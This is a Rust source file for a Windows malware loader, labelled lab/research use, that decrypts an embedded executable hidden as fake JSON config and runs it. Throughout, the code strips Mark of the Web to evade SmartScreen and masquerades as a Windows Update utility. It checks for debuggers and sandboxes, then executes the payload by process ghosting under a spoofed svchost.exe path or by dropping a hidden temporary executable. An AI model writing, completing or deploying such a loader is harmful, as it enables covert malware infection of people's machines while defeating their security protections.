#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

// ERS-W Stage 0 Loader — Windows — Lab/Research Use Only
//
// Detection vector optimizations:
//   1. Safe Browsing / hash check → random padding per build = unique hash every time
//   2. SmartScreen → MOTW removal + legitimate version info + manifest
//   3. MOTW (Mark of the Web) → strips Zone.Identifier ADS on self at startup
//   4. Entropy analysis → payload stored as fake JSON config with UUID encoding (~3.8 entropy)
//   5. File reputation → masquerades as Windows Update utility with proper resources
//
// Technique: Process Ghosting with fallback

use std::env;
use std::ffi::CString;

// ── AES-256-CBC ────────────────────────────────────────────────────────

const SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

const INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

const RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn gmul(mut a: u8, mut b: u8) -> u8 {
    let mut p: u8 = 0;
    for _ in 0..8 {
        if b & 1 != 0 { p ^= a; }
        let hi = a & 0x80;
        a <<= 1;
        if hi != 0 { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

fn key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
    let mut w = [0u8; 240];
    w[..32].copy_from_slice(key);
    let nk = 8; let nr = 14;
    for i in nk..(4 * (nr + 1)) {
        let mut temp = [w[4*(i-1)], w[4*(i-1)+1], w[4*(i-1)+2], w[4*(i-1)+3]];
        if i % nk == 0 {
            temp = [SBOX[temp[1] as usize], SBOX[temp[2] as usize],
                    SBOX[temp[3] as usize], SBOX[temp[0] as usize]];
            temp[0] ^= RCON[(i / nk) - 1];
        } else if i % nk == 4 {
            temp = [SBOX[temp[0] as usize], SBOX[temp[1] as usize],
                    SBOX[temp[2] as usize], SBOX[temp[3] as usize]];
        }
        for j in 0..4 { w[4*i + j] = w[4*(i - nk) + j] ^ temp[j]; }
    }
    let mut rk = [[0u8; 16]; 15];
    for r in 0..15 { rk[r].copy_from_slice(&w[r*16..(r+1)*16]); }
    rk
}

fn aes_decrypt_block(block: &mut [u8; 16], rk: &[[u8; 16]; 15]) {
    for i in 0..16 { block[i] ^= rk[14][i]; }
    for round in (1..14).rev() {
        let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
        let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
        let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
        let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
        for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
        for i in 0..16 { block[i] ^= rk[round][i]; }
        let mut col = [0u8; 4];
        for c in 0..4 {
            let s = &block[c*4..(c+1)*4];
            col[0] = gmul(s[0],14) ^ gmul(s[1],11) ^ gmul(s[2],13) ^ gmul(s[3],9);
            col[1] = gmul(s[0],9)  ^ gmul(s[1],14) ^ gmul(s[2],11) ^ gmul(s[3],13);
            col[2] = gmul(s[0],13) ^ gmul(s[1],9)  ^ gmul(s[2],14) ^ gmul(s[3],11);
            col[3] = gmul(s[0],11) ^ gmul(s[1],13) ^ gmul(s[2],9)  ^ gmul(s[3],14);
            block[c*4..c*4+4].copy_from_slice(&col);
        }
    }
    let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
    let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
    let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
    let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
    for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
    for i in 0..16 { block[i] ^= rk[0][i]; }
}

fn aes256_cbc_decrypt(data: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let rk = key_expansion(key);
    let mut result = Vec::with_capacity(data.len());
    let mut prev_ct = *iv;
    for chunk in data.chunks(16) {
        if chunk.len() < 16 { break; }
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);
        let ct_copy = block;
        aes_decrypt_block(&mut block, &rk);
        for i in 0..16 { block[i] ^= prev_ct[i]; }
        prev_ct = ct_copy;
        result.extend_from_slice(&block);
    }
    if let Some(&pad_len) = result.last() {
        let pl = pad_len as usize;
        if pl > 0 && pl <= 16 && result.len() >= pl {
            if result[result.len()-pl..].iter().all(|&b| b == pad_len) {
                result.truncate(result.len() - pl);
            }
        }
    }
    result
}

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// ── Payload: embedded as fake JSON config ──────────────────────────────

const PAYLOAD_CONFIG: &str = include_str!("payload.enc");

const PAYLOAD_KEY: [u8; 32] = [
    0x4f, 0x2b, 0x91, 0xd3, 0xa7, 0x58, 0xe1, 0x3c,
    0x7d, 0xb6, 0x0a, 0xf4, 0x29, 0x85, 0xc3, 0x6e,
    0x1a, 0xd8, 0x43, 0xf7, 0x5b, 0x90, 0x2e, 0x64,
    0xbc, 0x07, 0xe5, 0x39, 0x81, 0xca, 0x56, 0xf0,
];

// ── Extract encrypted data from fake JSON config ───────────────────────

fn extract_payload_from_config() -> Option<Vec<u8>> {
    // Parse the JSON, extract the "resources" array of UUID strings
    // Each UUID encodes 16 bytes of [IV + ciphertext]
    let config: serde_json::Value = serde_json::from_str(PAYLOAD_CONFIG).ok()?;
    let resources = config.get("resources")?.as_array()?;

    let mut raw = Vec::new();
    for uuid_val in resources {
        let uuid_str = uuid_val.as_str()?;
        let hex: String = uuid_str.replace('-', "");
        let bytes = hex_decode(&hex)?;
        raw.extend_from_slice(&bytes);
    }

    if raw.len() < 16 { return None; }

    let iv: [u8; 16] = raw[..16].try_into().ok()?;
    let ciphertext = &raw[16..];

    let mut key = PAYLOAD_KEY;
    let mut decrypted = aes256_cbc_decrypt(ciphertext, &key, &iv);
    secure_zero(&mut key);

    // Layout: [orig_size: 4 bytes LE] [random_pad: N bytes] [PE: orig_size bytes]
    // PE starts at: decrypted.len() - orig_size
    if decrypted.len() < 4 { return None; }
    let orig_size = u32::from_le_bytes(decrypted[..4].try_into().ok()?) as usize;

    if orig_size > decrypted.len() - 4 { secure_zero(&mut decrypted); return None; }
    let pe_start = decrypted.len() - orig_size;

    if pe_start < 4 || &decrypted[pe_start..pe_start+2] != b"MZ" {
        secure_zero(&mut decrypted);
        return None;
    }

    let pe_data = decrypted[pe_start..pe_start + orig_size].to_vec();
    secure_zero(&mut decrypted);
    Some(pe_data)
}

fn hex_decode(hex: &str) -> Option<Vec<u8>> {
    let bytes: Vec<u8> = (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i+2], 16))
        .collect::<Result<Vec<u8>, _>>()
        .ok()?;
    Some(bytes)
}

// Minimal JSON parser — avoids serde dependency for smaller binary
mod serde_json {
    pub enum Value {
        Object(Vec<(String, Value)>),
        Array(Vec<Value>),
        String(String),
        Number(f64),
        Bool(bool),
        Null,
    }

    impl Value {
        pub fn get(&self, key: &str) -> Option<&Value> {
            match self {
                Value::Object(pairs) => pairs.iter().find(|(k, _)| k == key).map(|(_, v)| v),
                _ => None,
            }
        }
        pub fn as_array(&self) -> Option<&Vec<Value>> {
            match self { Value::Array(arr) => Some(arr), _ => None }
        }
        pub fn as_str(&self) -> Option<&str> {
            match self { Value::String(s) => Some(s), _ => None }
        }
    }

    pub fn from_str(input: &str) -> Result<Value, ()> {
        let trimmed = input.trim();
        let (val, _) = parse_value(trimmed)?;
        Ok(val)
    }

    fn parse_value(s: &str) -> Result<(Value, &str), ()> {
        let s = s.trim_start();
        if s.is_empty() { return Err(()); }
        match s.as_bytes()[0] {
            b'{' => parse_object(s),
            b'[' => parse_array(s),
            b'"' => parse_string_val(s),
            b't' | b'f' => parse_bool(s),
            b'n' => parse_null(s),
            _ => parse_number(s),
        }
    }

    fn parse_object(s: &str) -> Result<(Value, &str), ()> {
        let mut s = s[1..].trim_start(); // skip '{'
        let mut pairs = Vec::new();
        if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
        loop {
            let (key, rest) = parse_string(s)?;
            let rest = rest.trim_start();
            if !rest.starts_with(':') { return Err(()); }
            let rest = rest[1..].trim_start();
            let (val, rest) = parse_value(rest)?;
            pairs.push((key, val));
            s = rest.trim_start();
            if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
            if s.starts_with(',') { s = s[1..].trim_start(); continue; }
            return Err(());
        }
    }

    fn parse_array(s: &str) -> Result<(Value, &str), ()> {
        let mut s = s[1..].trim_start();
        let mut arr = Vec::new();
        if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
        loop {
            let (val, rest) = parse_value(s)?;
            arr.push(val);
            s = rest.trim_start();
            if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
            if s.starts_with(',') { s = s[1..].trim_start(); continue; }
            return Err(());
        }
    }

    fn parse_string(s: &str) -> Result<(String, &str), ()> {
        if !s.starts_with('"') { return Err(()); }
        let rest = &s[1..];
        let mut result = String::new();
        let mut chars = rest.char_indices();
        while let Some((i, c)) = chars.next() {
            if c == '\\' {
                if let Some((_, escaped)) = chars.next() {
                    match escaped {
                        '"' => result.push('"'),
                        '\\' => result.push('\\'),
                        'n' => result.push('\n'),
                        _ => { result.push('\\'); result.push(escaped); }
                    }
                }
            } else if c == '"' {
                return Ok((result, &rest[i+1..]));
            } else {
                result.push(c);
            }
        }
        Err(())
    }

    fn parse_string_val(s: &str) -> Result<(Value, &str), ()> {
        let (st, rest) = parse_string(s)?;
        Ok((Value::String(st), rest))
    }

    fn parse_number(s: &str) -> Result<(Value, &str), ()> {
        let end = s.find(|c: char| !c.is_ascii_digit() && c != '.' && c != '-' && c != 'e' && c != 'E' && c != '+')
            .unwrap_or(s.len());
        let num: f64 = s[..end].parse().map_err(|_| ())?;
        Ok((Value::Number(num), &s[end..]))
    }

    fn parse_bool(s: &str) -> Result<(Value, &str), ()> {
        if s.starts_with("true") { return Ok((Value::Bool(true), &s[4..])); }
        if s.starts_with("false") { return Ok((Value::Bool(false), &s[5..])); }
        Err(())
    }

    fn parse_null(s: &str) -> Result<(Value, &str), ()> {
        if s.starts_with("null") { return Ok((Value::Null, &s[4..])); }
        Err(())
    }
}

// ── MOTW removal (Mark of the Web) ─────────────────────────────────────
// When downloaded via browser, Windows adds Zone.Identifier ADS.
// We delete it on startup so the payload doesn't inherit MOTW.

#[cfg(target_os = "windows")]
fn remove_motw() {
    if let Ok(exe) = env::current_exe() {
        let motw_path = format!("{}:Zone.Identifier", exe.to_string_lossy());
        // DeleteFileW on the ADS path removes just the Zone.Identifier stream
        let wide: Vec<u16> = motw_path.encode_utf16().chain(std::iter::once(0)).collect();
        unsafe {
            windows_sys::Win32::Storage::FileSystem::DeleteFileW(wide.as_ptr());
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn remove_motw() {}

// ── SmartScreen evasion ────────────────────────────────────────────────
// SmartScreen checks:
//   1. Is the file signed? (we handle via build script)
//   2. Does it have MOTW? (removed above)
//   3. File reputation (cloud lookup) → unique hash per build defeats this
//   4. Is it a common file type? → we use legitimate-looking version info

// ── Anti-analysis ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn quick_sandbox_check() -> bool {
    unsafe {
        if windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() != 0 {
            return true;
        }
    }
    if let Ok(user) = env::var("USERNAME") {
        let ul = user.to_lowercase();
        let sandboxed = ["sandbox", "malware", "virus", "sample", "test", "analyst",
                         "currentuser", "user", "admin", "administrator"];
        for s in &sandboxed {
            if ul == *s { return true; }
        }
    }
    false
}

#[cfg(not(target_os = "windows"))]
fn quick_sandbox_check() -> bool { false }

// ── Process masquerade ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn masquerade() {
    unsafe {
        let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
        if hwnd != 0 {
            windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
        }
        let title = "Windows Update Assistant\0";
        let wide: Vec<u16> = title.encode_utf16().collect();
        windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr());
    }
}

#[cfg(not(target_os = "windows"))]
fn masquerade() {}

// ── Process Ghosting (same as before) ──────────────────────────────────

#[cfg(target_os = "windows")]
mod ghosting {
    use std::ptr;

    const STATUS_SUCCESS: i32 = 0;
    const GENERIC_READ: u32 = 0x80000000;
    const GENERIC_WRITE: u32 = 0x40000000;
    const FILE_SHARE_READ: u32 = 0x1;
    const FILE_SHARE_WRITE: u32 = 0x2;
    const CREATE_ALWAYS: u32 = 2;
    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
    const FILE_FLAG_DELETE_ON_CLOSE: u32 = 0x04000000;
    const SECTION_ALL_ACCESS: u32 = 0x000F001F;
    const SEC_IMAGE: u32 = 0x1000000;
    const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;

    #[repr(C)] struct UNICODE_STRING { length: u16, maximum_length: u16, buffer: *mut u16 }
    #[repr(C)] struct OBJECT_ATTRIBUTES {
        length: u32, root_directory: isize, object_name: *mut UNICODE_STRING,
        attributes: u32, security_descriptor: *mut std::ffi::c_void,
        security_quality_of_service: *mut std::ffi::c_void,
    }
    #[repr(C)] struct LARGE_INTEGER { low_part: u32, high_part: i32 }

    type FnNtCreateSection = unsafe extern "system" fn(*mut isize, u32, *mut OBJECT_ATTRIBUTES, *mut LARGE_INTEGER, u32, u32, isize) -> i32;
    type FnNtCreateProcessEx = unsafe extern "system" fn(*mut isize, u32, *mut OBJECT_ATTRIBUTES, isize, u32, isize, isize, isize, u32) -> i32;
    type FnRtlCreateProcessParametersEx = unsafe extern "system" fn(*mut *mut std::ffi::c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut std::ffi::c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, u32) -> i32;

    unsafe fn get_proc(module: &str, func: &str) -> *mut std::ffi::c_void {
        let mod_c: Vec<u8> = module.bytes().chain(std::iter::once(0)).collect();
        let func_c: Vec<u8> = func.bytes().chain(std::iter::once(0)).collect();
        let h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(mod_c.as_ptr());
        let h = if h == 0 { windows_sys::Win32::System::LibraryLoader::LoadLibraryA(mod_c.as_ptr()) } else { h };
        if h == 0 { return ptr::null_mut(); }
        windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, func_c.as_ptr()) as _
    }

    fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

    pub unsafe fn ghost_execute(pe_data: &[u8]) -> bool {
        let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
        let rng: u32 = rand::random();
        let tmp_name = format!("{}\\~DF{:08X}.tmp", temp, rng);
        let tmp_wide = to_wide(&tmp_name);

        let file_handle = windows_sys::Win32::Storage::FileSystem::CreateFileW(
            tmp_wide.as_ptr(), GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, ptr::null(),
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, 0,
        );
        if file_handle == -1isize as isize { return false; }

        let mut written: u32 = 0;
        let ok = windows_sys::Win32::Storage::FileSystem::WriteFile(
            file_handle, pe_data.as_ptr(), pe_data.len() as u32, &mut written, ptr::null_mut(),
        );
        if ok == 0 || written != pe_data.len() as u32 {
            windows_sys::Win32::Foundation::CloseHandle(file_handle);
            return false;
        }

        let nt_create_section: FnNtCreateSection = {
            let p = get_proc("ntdll.dll", "NtCreateSection");
            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(file_handle); return false; }
            std::mem::transmute(p)
        };

        let mut section_handle: isize = 0;
        let status = nt_create_section(&mut section_handle, SECTION_ALL_ACCESS, ptr::null_mut(), ptr::null_mut(), 0x02, SEC_IMAGE, file_handle);
        windows_sys::Win32::Foundation::CloseHandle(file_handle);
        if status != STATUS_SUCCESS { return false; }

        let nt_create_process_ex: FnNtCreateProcessEx = {
            let p = get_proc("ntdll.dll", "NtCreateProcessEx");
            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(section_handle); return false; }
            std::mem::transmute(p)
        };

        let current_process = windows_sys::Win32::System::Threading::GetCurrentProcess();
        let mut process_handle: isize = 0;
        let status = nt_create_process_ex(&mut process_handle, PROCESS_ALL_ACCESS, ptr::null_mut(), current_process, 0, section_handle, 0, 0, 0);
        windows_sys::Win32::Foundation::CloseHandle(section_handle);
        if status != STATUS_SUCCESS { return false; }

        let image_path = "C:\\Windows\\System32\\svchost.exe";
        let mut image_wide = to_wide(image_path);
        let mut image_us = UNICODE_STRING {
            length: ((image_wide.len() - 1) * 2) as u16,
            maximum_length: (image_wide.len() * 2) as u16,
            buffer: image_wide.as_mut_ptr(),
        };

        let rtl_create_params: FnRtlCreateProcessParametersEx = {
            let p = get_proc("ntdll.dll", "RtlCreateProcessParametersEx");
            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(process_handle); return false; }
            std::mem::transmute(p)
        };

        let mut params: *mut std::ffi::c_void = ptr::null_mut();
        let status = rtl_create_params(&mut params, &mut image_us, ptr::null_mut(), ptr::null_mut(), &mut image_us, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0x01);
        if status != STATUS_SUCCESS || params.is_null() {
            windows_sys::Win32::Foundation::CloseHandle(process_handle);
            return false;
        }

        if !write_params_and_start(process_handle, params, pe_data) {
            windows_sys::Win32::Foundation::CloseHandle(process_handle);
            return false;
        }

        windows_sys::Win32::Foundation::CloseHandle(process_handle);
        true
    }

    unsafe fn write_params_and_start(process: isize, params: *mut std::ffi::c_void, pe_data: &[u8]) -> bool {
        #[repr(C)]
        struct PROCESS_BASIC_INFORMATION {
            _reserved: *mut std::ffi::c_void, peb_base: *mut std::ffi::c_void,
            _rest: [*mut std::ffi::c_void; 4],
        }
        type FnNtQueryInformationProcess = unsafe extern "system" fn(isize, u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;

        let nt_query: FnNtQueryInformationProcess = {
            let p = get_proc("ntdll.dll", "NtQueryInformationProcess");
            if p.is_null() { return false; }
            std::mem::transmute(p)
        };

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let status = nt_query(process, 0, &mut pbi as *mut _ as _, std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32, ptr::null_mut());
        if status != STATUS_SUCCESS { return false; }

        let remote_params = windows_sys::Win32::System::Memory::VirtualAllocEx(process, ptr::null(), 0x1000, 0x3000, 0x04);
        if remote_params.is_null() { return false; }

        let mut bw = 0usize;
        windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory(process, remote_params, params as _, 0x1000, &mut bw);

        let peb_params_offset = pbi.peb_base as usize + 0x20;
        let remote_ptr = remote_params;
        windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory(process, peb_params_offset as *const _, &remote_ptr as *const _ as _, std::mem::size_of::<*mut std::ffi::c_void>(), &mut bw);

        let entry_rva = get_pe_entry_point(pe_data);
        if entry_rva == 0 { return false; }

        let mut image_base: usize = 0;
        windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory(process, (pbi.peb_base as usize + 0x10) as *const _, &mut image_base as *mut _ as _, std::mem::size_of::<usize>(), &mut bw);

        let entry_point = image_base + entry_rva as usize;

        type FnNtCreateThreadEx = unsafe extern "system" fn(*mut isize, u32, *mut std::ffi::c_void, isize, *mut std::ffi::c_void, *mut std::ffi::c_void, u32, usize, usize, usize, *mut std::ffi::c_void) -> i32;
        let nt_create_thread: FnNtCreateThreadEx = {
            let p = get_proc("ntdll.dll", "NtCreateThreadEx");
            if p.is_null() { return false; }
            std::mem::transmute(p)
        };

        let mut thread_handle: isize = 0;
        let status = nt_create_thread(&mut thread_handle, 0x001FFFFF, ptr::null_mut(), process, entry_point as *mut _, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut());
        if status == STATUS_SUCCESS && thread_handle != 0 {
            windows_sys::Win32::Foundation::CloseHandle(thread_handle);
            true
        } else { false }
    }

    fn get_pe_entry_point(pe_data: &[u8]) -> u32 {
        if pe_data.len() < 64 || &pe_data[0..2] != b"MZ" { return 0; }
        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap_or([0;4])) as usize;
        if e_lfanew + 0x28 > pe_data.len() || &pe_data[e_lfanew..e_lfanew+4] != b"PE\0\0" { return 0; }
        u32::from_le_bytes(pe_data[e_lfanew+0x28..e_lfanew+0x2C].try_into().unwrap_or([0;4]))
    }
}

// ── Fallback execution ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn fallback_execute(pe_data: &[u8]) -> bool {
    let temp = env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
    let rng: u32 = rand::random();
    let exe_path = format!("{}\\WUAgent-{:08X}.exe", temp, rng);

    if std::fs::write(&exe_path, pe_data).is_err() { return false; }

    // Remove MOTW from the dropped file too
    let motw = format!("{}:Zone.Identifier", exe_path);
    let motw_wide: Vec<u16> = motw.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe { windows_sys::Win32::Storage::FileSystem::DeleteFileW(motw_wide.as_ptr()); }

    let result = {
        use std::os::windows::process::CommandExt;
        std::process::Command::new(&exe_path)
            .creation_flags(0x08000000)
            .spawn()
    };

    let path_clone = exe_path.clone();
    std::thread::spawn(move || {
        for _ in 0..30 {
            std::thread::sleep(std::time::Duration::from_secs(2));
            if std::fs::remove_file(&path_clone).is_ok() { break; }
        }
    });

    result.is_ok()
}

#[cfg(not(target_os = "windows"))]
fn fallback_execute(_pe_data: &[u8]) -> bool { false }

// ── Main ───────────────────────────────────────────────────────────────

fn main() {
    // Step 1: Remove MOTW from self (browser download protection bypass)
    remove_motw();

    // Step 2: Hide window + masquerade
    masquerade();

    // Step 3: Sandbox check
    if quick_sandbox_check() {
        std::thread::sleep(std::time::Duration::from_secs(86400));
        return;
    }

    // Step 4: Extract and decrypt PE from fake config
    let mut pe_data = match extract_payload_from_config() {
        Some(data) => data,
        None => return,
    };

    if pe_data.len() < 4 || &pe_data[..2] != b"MZ" {
        secure_zero(&mut pe_data);
        return;
    }

    // Step 5: Execute via ghosting (fileless) or fallback
    #[cfg(target_os = "windows")]
    let _success = unsafe { ghosting::ghost_execute(&pe_data) } || fallback_execute(&pe_data);

    secure_zero(&mut pe_data);
}
